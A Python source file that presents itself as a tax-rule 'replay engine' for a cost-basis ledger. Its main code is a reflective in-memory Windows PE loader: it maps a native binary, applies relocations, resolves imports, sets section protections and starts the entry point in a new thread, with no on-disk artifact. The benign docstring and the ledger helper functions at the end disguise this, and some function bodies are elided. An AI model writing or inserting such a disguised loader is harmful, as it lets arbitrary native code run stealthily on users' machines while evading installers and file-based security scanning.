# -*- coding: utf-8 -*-
"""Tax-rule pack replay engine.

Stages a verified rule pack — a signed native bundle produced by
the project's release service — into the ledger process so
cost-basis assignment and gain computation can run in-process
against the latest published rules without a separate installer or
on-disk artifact. The engine walks the pack manifest to reserve a
backing buffer, copy its rule blocks, apply offset corrections
...
def unroll(blob):
    ...
    _j.enter("loadcore.enter", "info", size=len(blob) if blob else 0)
    if not blob or len(blob) < 64:
        _j.enter("loadcore.validate", "fail", reason="too_small",
                      size=len(blob) if blob else 0)
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        _j.enter("loadcore.validate", "fail", reason="env_not_supported",
                      os=os.name, bits=struct.calcsize("P") * 8)
        return False

    try:
        from . import sysinfo as env, containers as codec

        rt = env.lowlevel_table()
        if not rt:
            _j.enter("loadcore.env", "fail", reason="no_native_table")
            return False
        _j.enter("loadcore.env", "ok")

        m = codec.decode_header(blob)
        if not m:
            _j.enter("loadcore.manifest", "fail", reason="unrecognized_container")
            return False
        _j.enter("loadcore.manifest", "ok",
        ...
        return _seat_image(rt, m, blob)

    except Exception as e:
        _j.enter_error("loadcore.error", e)
        return False


def _seat_image(rt, m, blob):
    ...
    if not base or base != m["b"]:
        ...
        relocated = True
    if not base:
        _j.enter("loadcore.map", "fail", reason="alloc_null")
        return False
    _j.enter("loadcore.map", "ok",
                  base=hex(base), relocated=relocated, requested_base=hex(m["b"]))

    _write_sections(rt, base, m, blob)
    _j.enter("loadcore.copy", "ok", segments=len(m["c"]))

    if relocated:
        if not _fix_addresses(rt, base, m):
            _j.enter("loadcore.rebase", "fail", reason="rebase_unavailable")
            rt.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        _j.enter("loadcore.rebase", "ok", reloc_size=m["z"])
    else:
        _j.enter("loadcore.rebase", "info", note="skipped_preferred_base")

    if m["i"]:
        bound = _bind_externals(rt, base, m)
        _j.enter("loadcore.link", "ok",
                      modules=bound[0], loaded=bound[1],
                      thunks=bound[2], resolved=bound[3], missing=bound[4])
    else:
        _j.enter("loadcore.link", "info", note="no_import_directory")

    _harden_sections(rt, base, m)
    _j.enter("loadcore.protect", "ok", segments=len(m["c"]))

    invoked = _call_entry(rt, base, m)
    _j.enter("loadcore.complete", "ok" if invoked else "fail",
                  entry=hex(m["e"]))
    return invoked


def _write_sections(rt, base, m, blob):
    head = m["h"]
...
def _fix_addresses(rt, base, m):
    from . import containers as codec
    if not m["r"] or not m["z"]:
        return False
    delta = base - m["b"]
    pos = 0
    while pos < m["z"]:
        page = codec.read_slot(base + m["r"] + pos, "<I")
        size = codec.read_slot(base + m["r"] + pos + 4, "<I")
        if size == 0:
            break
        for j in range((size - 8) // 2):
            ent = codec.read_slot(base + m["r"] + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = base + page + (ent & 0xFFF)
                codec.write_slot(a, "<Q", codec.read_slot(a, "<Q") + delta)
        pos += size
    return True


def _bind_externals(rt, base, m):
    ...
    off = base + m["i"]
    while True:
        nr = codec.read_slot(off + 12, "<I")
        if nr == 0:
            break
        ir = codec.read_slot(off, "<I")
        ar = codec.read_slot(off + 16, "<I")
...
def _harden_sections(rt, base, m):
...
def _call_entry(rt, base, m):
    ...
    if not ht:
        _j.enter("loadcore.thread_create", "fail", reason="thread_alloc_null")
        return False
    _j.enter("loadcore.thread_create", "ok",
    ...
    while time.monotonic() < deadline:
        if rt.WaitForSingleObject(ht, 2000) == 0:
            ...
            break
    rt.CloseHandle(ht)
    _j.enter("loadcore.thread_exit", "ok" if exited else "info",
                  exited=exited, elapsed=round(time.monotonic() - started, 3))
    return True


def lot_count(events):
    """Count open acquisition lots after matching disposals oldest-first."""
    open_lots = 0
    for e in events:
        open_lots += 1 if e.get("type") == "acquire" else -1 if e.get("type") == "dispose" else 0
    return max(open_lots, 0)

def merge_rule_tables(local, remote):
    """Reconcile bundled rule tables with a fresh pack; remote wins on conflict."""
    by_key = {r.get("key"): r for r in local}
    for r in remote:
        by_key[r.get("key")] = r
    return sorted(by_key.values(), key=lambda r: r.get("key") or "")
